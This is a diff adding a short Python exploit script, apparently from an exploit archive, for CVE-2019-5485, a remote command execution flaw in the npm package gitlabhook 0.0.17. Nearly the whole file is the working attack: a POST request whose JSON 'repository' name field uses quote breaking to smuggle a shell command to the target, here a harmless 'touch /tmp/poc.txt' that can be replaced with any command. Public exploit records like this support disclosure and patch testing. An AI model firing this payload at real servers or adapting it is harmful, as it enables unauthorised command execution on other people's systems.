@@ -1,0 +1,18 @@
+# Exploit Title: NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution
+# Date: 2019-09-13
+# Exploit Author: Semen Alexandrovich Lyhin
+# Vendor Homepage: https://www.npmjs.com/package/gitlabhook
+# Version: 0.0.17
+# Tested on: Kali Linux 2, Windows 10. 
+# CVE : CVE-2019-5485
+
+#!/usr/bin/python
+
+import requests
+
+target = "http://TARGET:3420"
+cmd = r"touch /tmp/poc.txt"
+json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
+r = requests.post(target, json)
+
+print "Done."
